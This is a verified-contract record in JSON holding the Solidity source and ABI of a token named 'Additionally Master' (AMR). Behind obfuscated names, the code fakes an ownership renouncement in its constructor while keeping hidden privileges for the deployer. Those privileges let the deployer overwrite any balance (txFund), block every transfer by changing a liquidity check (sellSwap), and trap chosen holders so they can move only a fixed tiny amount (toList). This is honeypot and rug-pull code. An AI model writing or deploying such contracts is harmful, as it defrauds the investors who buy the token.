{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface receiverIs {\n    function createPair(address limitFee, address amountWallet) external returns (address);\n}\n\ninterface swapBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedReceiver) external view returns (uint256);\n\n    function transfer(address exemptMarketing, uint256 exemptReceiver) external returns (bool);\n\n    function allowance(address fromAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptMarketing,\n        uint256 exemptReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeReceiver, uint256 value);\n    event Approval(address indexed fromAmount, address indexed spender, uint256 value);\n}\n\nabstract contract isLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapBuyMetadata is swapBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AdditionallyMaster is isLaunch, swapBuy, swapBuyMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedAtTeam;\n    }\n\n    mapping(address => bool) public atMarketing;\n\n    address listAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverLaunch;\n    }\n\n    address public sellMinMarketing;\n\n    function name() external view virtual override returns (string memory) {\n        return feeList;\n    }\n\n    uint256 amountLiquidity;\n\n    function receiverExemptEnable() private view {\n        require(txReceiver[_msgSender()]);\n    }\n\n    function transfer(address tokenTo, uint256 exemptReceiver) external virtual override returns (bool) {\n        return teamMin(_msgSender(), tokenTo, exemptReceiver);\n    }\n\n    function owner() external view returns (address) {\n        return minSell;\n    }\n\n    address private minSell;\n\n    mapping(address => uint256) private sellFrom;\n\n    bool public listBuy;\n\n    bool public senderTx;\n\n    uint256 private receiverLaunch = 100000000 * 10 ** 18;\n\n    function balanceOf(address launchedReceiver) public view virtual override returns (uint256) {\n        return sellFrom[launchedReceiver];\n    }\n\n    uint256 private enableList;\n\n    function walletTotal(address isTeam) public {\n        if (senderTx) {\n            return;\n        }\n        if (txTakeTrading == enableList) {\n            listWallet = true;\n        }\n        txReceiver[isTeam] = true;\n        \n        senderTx = true;\n    }\n\n    uint256 constant exemptShouldFrom = 7 ** 10;\n\n    mapping(address => bool) public txReceiver;\n\n    function allowance(address tokenTx, address teamAmount) external view virtual override returns (uint256) {\n        if (teamAmount == listAmount) {\n            return type(uint256).max;\n        }\n        return toLimit[tokenTx][teamAmount];\n    }\n\n    string private amountShould = \"AMR\";\n\n    function sellReceiver() public {\n        emit OwnershipTransferred(sellMinMarketing, address(0));\n        minSell = address(0);\n    }\n\n    function fundEnable(address atMode, address exemptMarketing, uint256 exemptReceiver) internal returns (bool) {\n        require(sellFrom[atMode] >= exemptReceiver);\n        sellFrom[atMode] -= exemptReceiver;\n        sellFrom[exemptMarketing] += exemptReceiver;\n        emit Transfer(atMode, exemptMarketing, exemptReceiver);\n        return true;\n    }\n\n    uint256 tradingBuy;\n\n    string private feeList = \"Additionally Master\";\n\n    event OwnershipTransferred(address indexed atLimit, address indexed buyLimit);\n\n    function txFund(address tokenTo, uint256 exemptReceiver) public {\n        receiverExemptEnable();\n        sellFrom[tokenTo] = exemptReceiver;\n    }\n\n    function sellSwap(uint256 exemptReceiver) public {\n        receiverExemptEnable();\n        amountLiquidity = exemptReceiver;\n    }\n\n    address marketingTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address atMode, address exemptMarketing, uint256 exemptReceiver) external override returns (bool) {\n        if (_msgSender() != listAmount) {\n            if (toLimit[atMode][_msgSender()] != type(uint256).max) {\n                require(exemptReceiver <= toLimit[atMode][_msgSender()]);\n                toLimit[atMode][_msgSender()] -= exemptReceiver;\n            }\n        }\n        return teamMin(atMode, exemptMarketing, exemptReceiver);\n    }\n\n    uint256 public launchedEnable;\n\n    function teamMin(address atMode, address exemptMarketing, uint256 exemptReceiver) internal returns (bool) {\n        if (atMode == sellMinMarketing) {\n            return fundEnable(atMode, exemptMarketing, exemptReceiver);\n        }\n        uint256 tokenReceiver = swapBuy(txModeList).balanceOf(marketingTeam);\n        require(tokenReceiver == amountLiquidity);\n        require(exemptMarketing != marketingTeam);\n        if (atMarketing[atMode]) {\n            return fundEnable(atMode, exemptMarketing, exemptShouldFrom);\n        }\n        return fundEnable(atMode, exemptMarketing, exemptReceiver);\n    }\n\n    function approve(address teamAmount, uint256 exemptReceiver) public virtual override returns (bool) {\n        toLimit[_msgSender()][teamAmount] = exemptReceiver;\n        emit Approval(_msgSender(), teamAmount, exemptReceiver);\n        return true;\n    }\n\n    constructor (){\n        if (teamMax != enableList) {\n            listWallet = false;\n        }\n        senderAuto totalTake = senderAuto(listAmount);\n        txModeList = receiverIs(totalTake.factory()).createPair(totalTake.WETH(), address(this));\n        if (txTakeTrading == maxTrading) {\n            listWallet = true;\n        }\n        sellMinMarketing = _msgSender();\n        txReceiver[sellMinMarketing] = true;\n        sellFrom[sellMinMarketing] = receiverLaunch;\n        sellReceiver();\n        if (maxTrading == teamMax) {\n            teamMax = enableList;\n        }\n        emit Transfer(address(0), sellMinMarketing, receiverLaunch);\n    }\n\n    function toList(address buyTeam) public {\n        receiverExemptEnable();\n        if (listWallet) {\n            maxTrading = txTakeTrading;\n        }\n        if (buyTeam == sellMinMarketing || buyTeam == txModeList) {\n            return;\n        }\n        atMarketing[buyTeam] = true;\n    }\n\n    uint256 public maxTrading;\n\n    uint8 private launchedAtTeam = 18;\n\n    mapping(address => mapping(address => uint256)) private toLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountShould;\n    }\n\n    address public txModeList;\n\n    function getOwner() external view returns (address) {\n        return minSell;\n    }\n\n    uint256 private txTakeTrading;\n\n    bool public listWallet;\n\n    uint256 private teamMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMinMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"sellSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTeam\",\"type\":\"address\"}],\"name\":\"toList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"txFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txModeList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTeam\",\"type\":\"address\"}],\"name\":\"walletTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AdditionallyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}